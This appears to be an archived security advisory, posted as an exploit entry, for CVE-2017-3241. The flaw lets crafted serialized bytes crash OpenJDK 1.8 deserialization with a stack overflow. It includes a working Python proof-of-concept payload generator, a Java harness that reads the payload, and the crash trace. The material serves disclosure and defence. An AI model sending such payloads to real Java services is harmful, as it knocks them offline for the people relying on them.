@@ -1,0 +1,297 @@
+id: 26786
+date: 01/23/2017
+title: Oracle OpenJDK Runtime Environment Build 1.8.0_112-b15 Denial Of Service Exploit
+author: Roman Shalymov
+cves: CVE-2017-3241
+
+Application: Java SE
+
+Vendor: Oracle
+
+Bug: DoS
+
+Reported: 23.12.2016
+
+Vendor response: 24.12.2016
+
+Date of Public Advisory: 17.01.2017
+
+Reference: Oracle CPU Jan 2017
+
+Author: Roman Shalymov
+
+
+
+1. ADVISORY INFORMATION
+
+Title: Oracle OpenJDK - Java Serialization DoS
+
+Advisory ID: [ERPSCAN-17-006]
+
+Risk: High
+
+Advisory URL:
+https://erpscan.com/advisories/erpscan-17-006-oracle-openjdk-java-serialization-dos-vulnerability/
+
+Date published: 17.01.2017
+
+Vendor contacted: Oracle
+
+
+2. VULNERABILITY INFORMATION
+
+
+Class: Denial of Service
+
+Remotely Exploitable: Yes
+
+Locally Exploitable: Yes
+
+CVE Name: CVE-2017-3241
+
+CVSS Base Score: 9.0
+
+
+3. VULNERABILITY DESCRIPTION
+
+
+An attacker can cause DoS of the application which uses OpenJDK Runtime
+Environment 1.8 as its core runtime engine.
+
+
+4. VULNERABLE PACKAGES
+
+
+OpenJDK Runtime Environment build 1.8.0_112-b15
+
+
+5. SOLUTIONS AND WORKAROUNDS
+
+
+Fix ObjectInputStream.skipCustomData() method, namely readObject0(false);
+call in switch statement
+
+Adress Oracle CPU January 2017
+
+6. AUTHOR
+
+
+Roman Shalymov (@shalymov)
+
+
+7. TECHNICAL DESCRIPTION
+
+
+An attacker can craft a malicious sequence of bytes that will cause JVM
+StackOverflowError in the standard Java deserialization process if it uses
+ObjectInputStream.readObject() method.
+
+
+
+7.1. Proof of Concept
+
+
+
+An attacker creates a malicious sequence of bytes, for example, using this
+python script pwn_ser.py:
+
+
+
+#!/usr/bin/env python2
+
+
+
+import sys
+
+
+
+exp = ""
+
+#serialization header
+
+exp += '\xac\xed\x00\x05'
+
+
+
+exp1 = ''
+
+exp1 += '\x72'
+
+exp1 += '\x00\x0c'+'java.io.File'
+
+exp1 += '\x41'*8
+
+exp1 += '\x00'
+
+exp1 += '\x00\x00'
+
+
+
+exp += exp1 * 10000
+
+
+
+sys.stdout.write(exp)
+
+
+
+and save it in exp2.ser file
+
+
+
+$ ./pwn_ser2.py > exp2.ser
+
+
+
+Let's simulate deserialization process. For this purpose, we create a
+simple Java program, which uses the following standard deserialization
+pattern:
+
+
+
+Serialize_read.java
+
+
+
+import java.io.FileInputStream;
+
+import java.io.ObjectInputStream;
+
+
+
+public class Serialize_read {
+
+
+
+public static void main(String args[]) throws Exception {
+
+
+
+if(args.length < 1) {
+
+System.out.println("usage: "+Serialize_read.class.getSimpleName()+"
+[file]");
+
+System.exit(-1);
+
+}
+
+
+
+FileInputStream fin = new FileInputStream(args[0]);
+
+ObjectInputStream oin = new ObjectInputStream(fin);
+
+
+
+try {
+
+Object objFromDisk = oin.readObject();
+
+String s = (String)objFromDisk;
+
+System.out.println(s);
+
+System.out.println("Successfully read!");
+
+}catch(Exception e){}
+
+System.exit(0);
+
+
+
+}
+
+
+
+}
+
+
+
+Let's try to read our malicious file (we can also simulate this stuff over
+network communication):
+
+
+
+$ javac Serialize_read.java
+
+$ java Serialize_read exp2.ser
+
+
+
+It causes the following error dump:
+
+
+
+Exception in thread "main" java.lang.StackOverflowError
+
+at
+java.io.ObjectInputStream$PeekInputStream.readFully(ObjectInputStream.java:2351)
+
+at
+java.io.ObjectInputStream$BlockDataInputStream.readUnsignedShort(ObjectInputStream.java:2834)
+
+at
+java.io.ObjectInputStream$BlockDataInputStream.readUTF(ObjectInputStream.java:2892)
+
+at java.io.ObjectInputStream.readUTF(ObjectInputStream.java:1075)
+
+at java.io.ObjectStreamClass.readNonProxy(ObjectStreamClass.java:684)
+
+at java.io.ObjectInputStream.readClassDescriptor(ObjectInputStream.java:833)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1609)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+
+
+...
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+
+
+8. REPORT TIMELINE
+
+Reported: 23.12.2016
+
+Vendor response: 24.12.2016
+
+Date of Public Advisory: 17.01.2017
+
+9. REFERENCES
+http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html
+https://erpscan.com/advisories/erpscan-17-006-oracle-openjdk-java-serialization-dos-vulnerability/
+
+#  0day.today [2023-03-24]  #
